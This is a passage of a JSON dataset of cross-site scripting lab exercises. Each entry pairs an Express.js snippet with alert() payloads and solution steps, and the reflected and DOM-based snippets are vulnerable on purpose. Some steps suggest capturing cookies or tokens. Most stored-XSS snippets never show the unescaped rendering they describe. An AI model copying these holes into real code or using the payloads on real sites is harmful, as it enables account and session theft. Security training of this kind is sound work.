    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/sign-petition', (req, res) => {\n  const reason = req.body.reason;\n  db.query(\"INSERT INTO signatures (reason) VALUES (?)\", [reason]);\n  res.send('Signed');\n});",
    "payloads": [
      "<script>alert('Petition')</script>",
      "<svg onload=alert('SignXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in help desk system subject field",
    "Lab Description": "Support tickets have subjects stored and shown unescaped in agent inbox.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit ticket with subject <script>alert('Support')</script>.",
      "Login as agent and open inbox.",
      "Trigger the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-ticket', (req, res) => {\n  const subject = req.body.subject;\n  db.query(\"INSERT INTO tickets (subject) VALUES (?)\", [subject]);\n  res.send('Ticket created');\n});",
    "payloads": [
      "<script>alert('Support')</script>",
      "<img src=x onerror=alert('HelpDesk')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in profile tag line",
    "Lab Description": "A social network allows users to set a public tagline. This tagline is stored and displayed on profile pages without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to profile settings and update tag line to <script>alert('TagXSS')</script>.",
      "Save changes and visit the public profile.",
      "Observe alert execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-tagline', (req, res) => {\n  const tagline = req.body.tagline;\n  db.query(\"UPDATE users SET tagline = ? WHERE id = ?\", [tagline, req.user.id]);\n  res.send('Tagline updated');\n});",
    "payloads": [
      "<script>alert('TagXSS')</script>",
      "<img src=x onerror=alert('Tag')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in recipe platform comments",
    "Lab Description": "A cooking site lets users comment on recipes. These comments are stored and rendered directly without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Post comment: <script>alert('Recipe')</script> on any recipe.",
      "View comment section and observe execution.",
      "Check persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO recipe_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('Recipe')</script>",
      "<svg/onload=alert('Comment')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracker issue title",
    "Lab Description": "A bug tracking system allows custom issue titles. These titles are stored and displayed in project views without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit issue with <script>alert('IssueXSS')</script> as title.",
      "Navigate to the project issues list.",
      "Observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-issue', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO issues (title) VALUES (?)\", [title]);\n  res.send('Issue submitted');\n});",
    "payloads": [
      "<script>alert('IssueXSS')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in contact us name field",
    "Lab Description": "The contact form stores the 'name' input and displays it in the admin dashboard without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit form with name: <script>alert('Contact')</script>.",
      "Login as admin and open messages.",
      "Observe execution of payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  db.query(\"INSERT INTO messages (name) VALUES (?)\", [name]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('Contact')</script>",
      "<svg/onload=alert('Form')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in code snippet sharing site",
    "Lab Description": "A developer platform allows code snippets to be shared. The 'description' field is stored and rendered without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a new snippet with <script>alert('Code')</script> as description.",
      "Visit snippet details page.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/share-snippet', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO snippets (description) VALUES (?)\", [description]);\n  res.send('Snippet shared');\n});",
    "payloads": [
      "<script>alert('Code')</script>",
      "<img src=x onerror=alert('Snippet')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event planner custom message",
    "Lab Description": "Users can send custom invites with a personal message. The message is shown on the invite view page unescaped.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send invite with <script>alert('Invite')</script> as message.",
      "Open the invitation link.",
      "Confirm payload executes."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-invite', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO invites (message) VALUES (?)\", [message]);\n  res.send('Invite sent');\n});",
    "payloads": [
      "<script>alert('Invite')</script>",
      "<svg/onload=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in library review system",
    "Lab Description": "Users can leave reviews for books. The review is rendered on the book page without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Leave review: <script>alert('Book')</script>.",
      "View the book review page.",
      "Observe XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/review-book', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (text) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('Book')</script>",
      "<img src=x onerror=alert('Read')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in job application cover letter",
    "Lab Description": "Applicants can add a cover letter message which is later rendered to recruiters without escaping.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit application with <script>alert('Cover')</script>.",
      "Recruiter opens applicant dashboard.",
      "Payload is executed."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply', (req, res) => {\n  const letter = req.body.letter;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [letter]);\n  res.send('Application submitted');\n});",
    "payloads": [
      "<script>alert('Cover')</script>",
      "<svg/onload=alert('Recruiter')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user-submitted poll option label",
    "Lab Description": "Users can suggest new options in polls. The label is stored and reflected without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit new option: <script>alert('Poll')</script>.",
      "View poll as voter.",
      "Payload is executed."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-option', (req, res) => {\n  const label = req.body.label;\n  db.query(\"INSERT INTO poll_options (label) VALUES (?)\", [label]);\n  res.send('Option added');\n});",
    "payloads": [
      "<script>alert('Poll')</script>",
      "<img src=x onerror=alert('Option')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event RSVP note",
    "Lab Description": "Attendees leave notes when RSVPing to events. These are shown to the host without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "RSVP with <script>alert('RSVP')</script> as note.",
      "Login as host and view guest list.",
      "Observe alert triggered."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO rsvps (note) VALUES (?)\", [note]);\n  res.send('RSVP submitted');\n});",
    "payloads": [
      "<script>alert('RSVP')</script>",
      "<svg/onload=alert('Note')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel journal post title",
    "Lab Description": "A travel blog allows users to submit journal entries with a title. The title is stored and rendered without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a journal post with title: <script>alert('Travel')</script>.",
      "View the blog entry in the public feed.",
      "Observe script execution on load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-journal', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO journals (title) VALUES (?)\", [title]);\n  res.send('Journal submitted');\n});",
    "payloads": [
      "<script>alert('Travel')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in university forum bio field",
    "Lab Description": "A university forum allows users to set a short bio. The bio is rendered without escaping in the user profile.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set your forum bio to <svg/onload=alert('Bio')>.",
      "Log out and visit your profile as a guest.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.user.id]);\n  res.send('Bio updated');\n});",
    "payloads": [
      "<svg/onload=alert('Bio')>",
      "<script>alert('ForumXSS')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in resume builder summary section",
    "Lab Description": "A resume builder platform allows users to write a summary. The summary field is rendered without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write a summary: <script>alert('Resume')</script>.",
      "Export or preview resume.",
      "Observe the alert on view."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-summary', (req, res) => {\n  const summary = req.body.summary;\n  db.query(\"UPDATE resumes SET summary = ? WHERE user_id = ?\", [summary, req.user.id]);\n  res.send('Summary saved');\n});",
    "payloads": [
      "<script>alert('Resume')</script>",
      "<img src=x onerror=alert('Summary')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in file-sharing platform description",
    "Lab Description": "The file-sharing app lets users write descriptions for uploaded files. These are shown to others without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload a file with description: <img src=x onerror=alert('File')>.",
      "Visit the file download page.",
      "Observe alert on load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-description', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO files (description) VALUES (?)\", [description]);\n  res.send('File uploaded');\n});",
    "payloads": [
      "<img src=x onerror=alert('File')>",
      "<svg/onload=alert('Upload')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online quiz title input",
    "Lab Description": "An online quiz creator allows instructors to name quizzes. These names are rendered on the student dashboard without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create quiz with title: <script>alert('Quiz')</script>.",
      "Login as student and view dashboard.",
      "Confirm alert execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-quiz', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO quizzes (title) VALUES (?)\", [title]);\n  res.send('Quiz created');\n});",
    "payloads": [
      "<script>alert('Quiz')</script>",
      "<svg/onload=alert('Student')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in portfolio description on freelance site",
    "Lab Description": "A freelancing platform lets users set descriptions for their portfolios. These are not sanitized when rendered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set description to <script>alert('Portfolio')</script>.",
      "View public portfolio page.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-portfolio', (req, res) => {\n  const description = req.body.description;\n  db.query(\"UPDATE portfolios SET description = ? WHERE user_id = ?\", [description, req.user.id]);\n  res.send('Portfolio saved');\n});",
    "payloads": [
      "<script>alert('Portfolio')</script>",
      "<img src=x onerror=alert('Freelance')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in fitness tracker workout name",
    "Lab Description": "Users can name their workouts. The names are stored and displayed without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create workout with name <script>alert('Workout')</script>.",
      "Open workout history.",
      "Observe alert firing."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/log-workout', (req, res) => {\n  const name = req.body.name;\n  db.query(\"INSERT INTO workouts (name) VALUES (?)\", [name]);\n  res.send('Workout saved');\n});",
    "payloads": [
      "<script>alert('Workout')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in conference system speaker bio",
    "Lab Description": "Speakers can submit bios for conferences. These bios are shown without escaping on the agenda page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit speaker bio: <script>alert('Speaker')</script>.",
      "Access public conference agenda.",
      "Observe execution of payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"INSERT INTO speakers (bio) VALUES (?)\", [bio]);\n  res.send('Bio submitted');\n});",
    "payloads": [
      "<script>alert('Speaker')</script>",
      "<svg/onload=alert('Bio')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in blog platform series description",
    "Lab Description": "Writers can create a series of articles and add a description. The description is rendered without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create new series with description: <script>alert('Series')</script>.",
      "Navigate to the series overview page.",
      "Observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-series', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO series (description) VALUES (?)\", [description]);\n  res.send('Series created');\n});",
    "payloads": [
      "<script>alert('Series')</script>",
      "<img src=x onerror=alert('Blog')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in idea board submission",
    "Lab Description": "Users can submit ideas to a public board. The content is stored and displayed without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit new idea: <script>alert('Idea')</script>.",
      "Browse public board and observe alert.",
      "Test for persistence and filter bypass."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-idea', (req, res) => {\n  const idea = req.body.idea;\n  db.query(\"INSERT INTO ideas (content) VALUES (?)\", [idea]);\n  res.send('Idea submitted');\n});",
    "payloads": [
      "<script>alert('Idea')</script>",
      "<svg/onload=alert('Board')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in employee recognition message field",
    "Lab Description": "The HR system allows employees to send recognition messages to each other. These messages are rendered directly on the dashboard without sanitization. To solve: Inject a stored XSS payload in a recognition message that executes on page load.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a recognition message containing <script>alert('XSS')</script>.",
      "Intercept using Burp Suite to verify storage.",
      "Login with a different user and view the dashboard.",
      "Observe script execution in another user's session.",
      "Test filter bypass with image/onerror payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/recognition', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO recognition (message) VALUES (?)\", [msg]); res.redirect('/dashboard'); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in support request form redirect",
    "Lab Description": "A support request form redirects to a confirmation page using a GET parameter for the user's name. The value is reflected in the HTML without encoding. To solve: Inject a reflected XSS payload into the name parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a request with ?name=<script>alert('XSS')</script>.",
      "Observe reflection in the confirmation page.",
      "Verify script execution occurs on page load.",
      "Try SVG-based variants to evade filters.",
      "Confirm in multiple browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/confirm', (req, res) => { const name = req.query.name; res.send(`<h1>Thanks ${name}</h1>`); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in campaign announcement preview",
    "Lab Description": "A marketing tool generates live previews of announcements using innerHTML from user input. There's no sanitization, resulting in DOM-based XSS. To solve: Inject a script payload and verify execution in preview pane.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Type <script>alert('XSS')</script> into the preview input field.",
      "Preview panel updates immediately.",
      "Observe script execution.",
      "Try using <img> or <svg> variants.",
      "Confirm execution without server-side interaction."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/preview', (req, res) => { res.send(`<html><body><div id='output'></div><script>document.getElementById('output').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`); });",
    "payloads": [
      "#<script>alert('XSS')</script>",
      "#<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Mutation-based XSS in dynamic invoice line editor",
    "Lab Description": "An invoicing app allows adding custom line items. DOM mutations from a contentEditable field lead to unsafe innerHTML injection. To solve: Inject a payload that triggers JavaScript on DOM mutation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Enter <img src=x onerror=alert(1)> in a line item name.",
      "Save and reload invoice editor.",
      "Observer executes as innerHTML mutates.",
      "Test DOM events like onmouseover.",
      "Check persistence on save/load cycle."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/save-line', (req, res) => { const line = req.body.item; db.query(\"INSERT INTO lines (item) VALUES (?)\", [line]); res.redirect('/editor'); });",
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('lineXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in public event RSVP comments",
    "Lab Description": "The app collects public RSVP comments for events, which are shown without escaping. This enables stored XSS. To solve: Submit a comment that executes JavaScript when the event page loads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit RSVP comment: <script>alert('RSVP')</script>.",
      "Check event page and observe execution.",
      "Confirm script runs across all sessions.",
      "Try alternative payloads.",
      "Capture cookies using external requests."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/rsvp', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO rsvps (comment) VALUES (?)\", [comment]); res.redirect('/event'); });",
    "payloads": [
      "<script>alert('RSVP')</script>",
      "<img src=1 onerror=alert('RSVP')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in feedback widget thank you banner",
    "Lab Description": "A floating feedback widget reflects user input in a thank you banner post-submission. There's no encoding, leading to reflected XSS. To solve: Inject a payload and trigger the banner display.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Fill feedback form with name = <script>alert('XSS')</script>.",
      "Observe thank you message.",
      "Confirm script runs in response HTML.",
      "Test different payload shapes.",
      "Try encoded payloads to test filter behavior."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { const name = req.body.name; res.send(`<p>Thank you, ${name}</p>`); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('ThankYou')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in admin system announcement bar",
    "Lab Description": "Admins can set system-wide announcements shown to all users. The announcement is rendered as raw HTML, allowing stored XSS. To solve: Insert a script in the announcement field.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as admin and set announcement = <script>alert('XSS')</script>.",
      "Logout and visit the user dashboard.",
      "Observe announcement bar execution.",
      "Test iframe/srcdoc combinations.",
      "Capture tokens if possible."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/admin/announce', (req, res) => { const msg = req.body.announcement; db.query(\"INSERT INTO announcements (text) VALUES (?)\", [msg]); res.redirect('/admin'); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<iframe srcdoc='<script>alert(1)</script>'>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in video platform comment preview",
    "Lab Description": "A video site previews comments with JavaScript using innerHTML. The preview uses user input directly. To solve: Inject a DOM-based payload in a comment preview.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter <script>alert('Preview')</script> in comment field.",
      "Observe live preview pane.",
      "Check execution on blur/change.",
      "Try bypass with malformed tags.",
      "Verify across devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/', (req, res) => { res.send(`<html><body><textarea id='cmt'></textarea><div id='preview'></div><script>document.getElementById('cmt').addEventListener('input', e => { document.getElementById('preview').innerHTML = e.target.value; });</script></body></html>`); });",
    "payloads": [
      "<script>alert('Preview')</script>",
      "<img src=x onerror=alert('CMT')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in student discussion board replies",
    "Lab Description": "Students can reply to discussion threads. Replies are saved in a database and rendered without escaping. To solve: Inject a persistent XSS payload in a reply.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Reply to thread with <script>alert('Reply')</script>.",
      "Verify storage via intercepted POST.",
      "Reload thread and see execution.",
      "Try using encoded HTML tags.",
      "Ensure it affects other users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/reply', (req, res) => { const reply = req.body.reply; db.query(\"INSERT INTO replies (text) VALUES (?)\", [reply]); res.redirect('/thread'); });",
    "payloads": [
      "<script>alert('Reply')</script>",
      "<svg/onload=alert('ReplyXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in PDF export metadata field",
    "Lab Description": "An export-to-PDF tool includes metadata from query parameters. These are inserted into the PDF preview HTML unsafely. To solve: Inject a payload into the metadata field and trigger PDF preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /export?meta=<script>alert('PDF')</script>.",
      "Preview the export page.",
      "Confirm JavaScript execution before PDF rendering.",
      "Try SVG and iframe variants.",
      "Observe DOM injection location."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/export', (req, res) => { const meta = req.query.meta; res.send(`<html><body><h3>${meta}</h3></body></html>`); });",
    "payloads": [
      "<script>alert('PDF')</script>",
      "<img src=x onerror=alert('META')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracker issue title",
    "Lab Description": "The bug tracking system allows users to create issues with titles. These titles are stored and rendered on the dashboard without escaping, allowing persistent XSS. To solve: Inject a script in the issue title and confirm execution on issue board view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an issue titled <script>alert('XSS')</script>.",
      "Intercept the POST request using Burp Suite.",
      "Reload the issue board to observe execution.",
      "Try alternate tags to bypass filters.",
      "Confirm script executes for all users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/report-issue', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO issues (title) VALUES (?)\", [title]); res.redirect('/issues'); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter unsubscribe confirmation",
    "Lab Description": "The unsubscribe page includes the user's email from a GET parameter and renders it into the confirmation HTML. This allows reflected XSS. To solve: Inject a payload into the email parameter and observe execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /unsubscribe?email=<script>alert('XSS')</script>.",
      "Check if input is reflected without encoding.",
      "Observe script execution in HTML.",
      "Try different encodings to bypass filters.",
      "Test across different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/unsubscribe', (req, res) => { const email = req.query.email; res.send(`<h2>Unsubscribed: ${email}</h2>`); });",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('UNSUB')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in blog post comment field",
    "Lab Description": "The blog platform allows commenting on posts. Comments are stored and displayed without sanitization. To solve: Submit a comment with an XSS payload and observe it triggering for readers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Comment with <script>alert('BlogXSS')</script>.",
      "Reload post page to verify script execution.",
      "Use Burp to verify database storage.",
      "Check in incognito or other account.",
      "Confirm persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/comment', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]); res.redirect('/post'); });",
    "payloads": [
      "<script>alert('BlogXSS')</script>",
      "<img src=x onerror=alert(123)>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in report generator title preview",
    "Lab Description": "A report generator allows users to input titles. The title is updated live via `innerHTML` without sanitization, enabling DOM-based XSS. To solve: Inject a payload in the title preview field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter <script>alert('Title')</script> in the title input.",
      "Observe live preview updates with innerHTML.",
      "Script executes on input.",
      "Confirm if bypasses like <svg> also work.",
      "Try across devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/report', (req, res) => { res.send(`<html><body><input id='title'/><div id='preview'></div><script>document.getElementById('title').addEventListener('input', e => { document.getElementById('preview').innerHTML = e.target.value; });</script></body></html>`); });",
    "payloads": [
      "<script>alert('Title')</script>",
      "<svg/onload=alert('X')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in FAQ suggestion form",
    "Lab Description": "Users can submit suggestions to be displayed on the FAQ page. These are rendered without escaping. To solve: Submit a script tag in a suggestion and verify execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a suggestion with <script>alert('FAQ')</script>.",
      "Admin approves it and it's shown in FAQ list.",
      "Reload FAQ and confirm script runs.",
      "Check from different account.",
      "Try image tag-based variants."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-faq', (req, res) => { const question = req.body.question; db.query(\"INSERT INTO faq (question) VALUES (?)\", [question]); res.redirect('/faq'); });",
    "payloads": [
      "<script>alert('FAQ')</script>",
      "<img src=x onerror=alert('FAQ')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in gift card generator preview",
    "Lab Description": "The site generates gift card previews using query params. These are rendered without encoding, causing reflected XSS. To solve: Inject JavaScript in the name parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /gift?name=<script>alert('Gift')</script>.",
      "Observe reflected input in HTML.",
      "Script executes on load.",
      "Try using <iframe> variants.",
      "Test in mobile view."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/gift', (req, res) => { const name = req.query.name; res.send(`<h1>Gift for ${name}</h1>`); });",
    "payloads": [
      "<script>alert('Gift')</script>",
      "<iframe srcdoc='<script>alert(1)</script>'>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in dynamic pricing calculator",
    "Lab Description": "The calculator app reflects query parameters into a summary box via innerHTML. It does not sanitize the input. To solve: Inject a payload into a query parameter and observe execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open /price.html#discount=<svg/onload=alert('XSS')>",
      "Observe innerHTML injection.",
      "Check if script runs in summary box.",
